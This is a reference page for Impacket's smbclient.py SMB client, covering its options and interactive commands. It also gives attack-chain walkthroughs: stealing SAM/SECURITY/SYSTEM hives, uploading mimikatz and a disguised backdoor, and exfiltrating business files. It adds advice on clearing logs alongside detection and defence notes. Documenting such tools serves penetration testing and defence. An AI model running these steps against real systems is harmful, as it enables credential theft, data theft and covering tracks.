# smbclient.py

## Overview
`smbclient.py` is an Impacket implementation of an SMB client that allows interaction with SMB shares on Windows and Linux systems. It provides functionality similar to the Linux smbclient command but with additional features specific to penetration testing and security assessment.

## Detailed Description
This tool provides comprehensive SMB client functionality for connecting to and interacting with SMB/CIFS shares. It supports various authentication methods and provides both interactive and non-interactive modes for file operations, making it essential for lateral movement and data exfiltration.

### Key Features:
- **Interactive SMB Shell**: Browse and manipulate files on remote shares
- **Multiple Authentication**: Password, hash, and Kerberos authentication
- **File Operations**: Upload, download, list, and manipulate files
- **Share Enumeration**: List available shares on target systems
- **Cross-Platform**: Works with Windows and Samba shares
- **Stealth Operations**: Minimal logging footprint on target systems

### Technical Details:
- Uses SMB protocol versions 1, 2, and 3
- Supports NTLM and Kerberos authentication
- Implements proper SMB session management
- Handles various share types (disk, print, IPC)

## Command Line Options

```
usage: smbclient.py [-h] [-file FILE] [-debug] [-hashes LMHASH:NTHASH] 
                    [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip]
                    [-target-ip ip] [-port [destination port]]
                    target

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>

Optional Arguments:
  -file                 Input file with commands to execute
  -debug                Turn DEBUG output ON
  
Authentication:
  -hashes               NTLM hashes (LM:NT)
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey               AES key to use for Kerberos Authentication
  -dc-ip                IP Address of the domain controller
  -target-ip            IP Address of the target machine
  -port                 Destination port to connect to SMB Server
```

## Usage Examples

### Basic Connection
```bash
# Connect with username and password
python3 smbclient.py domain.com/user:password@target.domain.com

# Connect with NTLM hash
python3 smbclient.py -hashes :ntlmhash domain.com/user@target.domain.com

# Connect with Kerberos authentication
python3 smbclient.py -k domain.com/user@target.domain.com -dc-ip 192.168.1.10
```

### Anonymous and Guest Access
```bash
# Anonymous connection
python3 smbclient.py target.domain.com

# Guest connection
python3 smbclient.py guest@target.domain.com

# Null session
python3 smbclient.py ''@target.domain.com
```

### Non-Interactive Mode
```bash
# Execute commands from file
python3 smbclient.py domain.com/user:password@target.domain.com -file commands.txt

# Single command execution (requires command file)
echo "shares" > cmd.txt && python3 smbclient.py domain.com/user:password@target.domain.com -file cmd.txt
```

### Network Options
```bash
# Specify target IP directly
python3 smbclient.py domain.com/user:password@target.domain.com -target-ip 192.168.1.100

# Use custom SMB port
python3 smbclient.py domain.com/user:password@target.domain.com -port 445

# Enable debug output
python3 smbclient.py domain.com/user:password@target.domain.com -debug
```

## Interactive Commands

### Share Operations
```bash
# List available shares
shares

# Connect to specific share
use SHARENAME

# Show current share
info
```

### File and Directory Operations
```bash
# List directory contents
ls
dir

# Change directory
cd directory_name
cd ..
cd \

# Print working directory
pwd

# Create directory
mkdir new_directory

# Remove directory
rmdir directory_name
```

### File Transfer Operations
```bash
# Download file
get filename
get remote_file local_file

# Upload file
put local_file
put local_file remote_file

# Delete file
del filename
rm filename

# Rename file
rename old_name new_name
```

### Information Gathering
```bash
# Show file information
info filename

# Display file contents (text files)
cat filename
more filename

# Search for files
find *.txt
find . -name "*.config"
```

### System Commands
```bash
# Show SMB server information
info

# List open files
who

# Close connection
exit
quit
```

## Attack Chain Integration

### Initial Reconnaissance
```bash
# Step 1: Enumerate shares anonymously
python3 smbclient.py target.domain.com
# In shell: shares

# Step 2: Access readable shares
python3 smbclient.py target.domain.com
# In shell: use C$, ls

# Step 3: Look for sensitive files
# In shell: find . -name "*.config"
# In shell: find . -name "password*"
```

### Credential Harvesting
```bash
# Step 1: Connect with obtained credentials
python3 smbclient.py domain.com/user:password@target.domain.com

# Step 2: Browse for sensitive data
# use C$
# cd Users
# cd Administrator
# cd Desktop
# get ntuser.dat

# Step 3: Extract configuration files
# cd Windows\System32\config
# get SAM
# get SECURITY
# get SYSTEM
```

### Lateral Movement Support
```bash
# Step 1: Upload tools for lateral movement
python3 smbclient.py domain.com/user:password@target.domain.com
# use ADMIN$
# cd Temp
# put mimikatz.exe
# put psexec.exe

# Step 2: Verify upload
# ls
# info mimikatz.exe

# Step 3: Use uploaded tools with other Impacket scripts
python3 psexec.py domain.com/user:password@target.domain.com "C:\\Windows\\Temp\\mimikatz.exe"
```

### Data Exfiltration
```bash
# Step 1: Identify valuable data
python3 smbclient.py domain.com/user:password@fileserver.domain.com
# shares
# use Documents$
# find . -name "*.xlsx"
# find . -name "*.docx"

# Step 2: Download sensitive files
# get "Financial Report 2024.xlsx"
# get "Employee Database.xlsx" 
# get "Network Diagram.docx"

# Step 3: Browse user profiles for additional data
# use C$
# cd Users
# ls
# cd john.doe
# cd Documents
# get *.pdf
```

## Advanced Usage

### Batch Operations
```bash
# Create command file for automated operations
cat > batch_commands.txt << EOF
shares
use C$
cd Windows
cd System32
ls
get notepad.exe
EOF

# Execute batch commands
python3 smbclient.py domain.com/user:password@target.domain.com -file batch_commands.txt
```

### Steganography and Hiding Files
```bash
# Hide files in legitimate locations
python3 smbclient.py domain.com/user:password@target.domain.com
# use C$
# cd Windows\System32
# put backdoor.exe svchost.exe.bak
# cd Windows\Temp
# mkdir "System Volume Information"
# cd "System Volume Information"
# put payload.exe
```

### Log Analysis and Forensics
```bash
# Access event logs
python3 smbclient.py domain.com/user:password@target.domain.com
# use C$
# cd Windows\System32\winevt\Logs
# ls
# get Security.evtx
# get System.evtx
# get Application.evtx
```

## Common Shares and Their Uses

### Administrative Shares
- **ADMIN$**: Administrative share pointing to Windows directory
- **C$**: Administrative share for C: drive
- **IPC$**: Inter-process communication share

### Default Shares
- **NETLOGON**: Domain controller logon scripts
- **SYSVOL**: Group Policy and logon scripts
- **print$**: Printer drivers

### Custom Shares
- **Documents**: Document repositories
- **Software**: Software distribution
- **Backup**: Backup files and data

## Prerequisites
- Network access to target SMB service (port 445/139)
- Valid credentials or anonymous access allowed
- SMB service running on target system
- Appropriate permissions for desired operations

## Detection Considerations
- **Event ID 4624/4625**: Successful/failed logon events
- **Event ID 4634**: Account logoff events
- **Event ID 5140**: Network share access events
- **Event ID 5145**: Network share object access events
- **Process Monitoring**: Unusual file access patterns
- **Network Monitoring**: SMB traffic from unusual sources

## Defensive Measures
- **Disable Anonymous Access**: Remove anonymous/guest access to shares
- **Share Permissions**: Implement proper NTFS and share permissions
- **Administrative Shares**: Disable default administrative shares if not needed
- **Access Logging**: Enable detailed SMB access logging
- **Network Segmentation**: Limit SMB access between network segments
- **Regular Audits**: Audit share permissions and access logs regularly

## Troubleshooting Common Issues

### Access Denied Errors
```bash
# Check share permissions
python3 smbclient.py domain.com/user:password@target.domain.com
# shares (verify share exists and is accessible)

# Verify credentials
net use \\target\sharename /user:domain\user password
```

### Connection Timeouts
```bash
# Test network connectivity
ping target.domain.com
telnet target.domain.com 445

# Check SMB versions
nmap -p 445 --script smb-protocols target.domain.com
```

### Authentication Failures
```bash
# Test different authentication methods
python3 smbclient.py -hashes :hash target.domain.com
python3 smbclient.py -k domain.com/user@target.domain.com

# Check domain controller connectivity for Kerberos
ping dc.domain.com
```

## Security Considerations

### Operational Security
- Use encrypted connections when possible
- Avoid leaving temporary files on target systems
- Clear command history and logs where possible
- Use legitimate-looking filenames for uploads

### Evidence Handling
- Document all accessed files and directories
- Maintain chain of custody for downloaded evidence
- Use appropriate tools for forensic imaging when required

## Related Tools
- [psexec.py](psexec.md) - Remote command execution using SMB
- [smbexec.py](smbexec.md) - Alternative SMB-based execution
- [secretsdump.py](secretsdump.md) - Extract credentials via SMB
- [wmiexec.py](wmiexec.md) - WMI-based remote execution
- [ntlmrelayx.py](ntlmrelayx.md) - NTLM relay attacks using SMB
- [rpcdump.py](rpcdump.md) - RPC enumeration over SMB
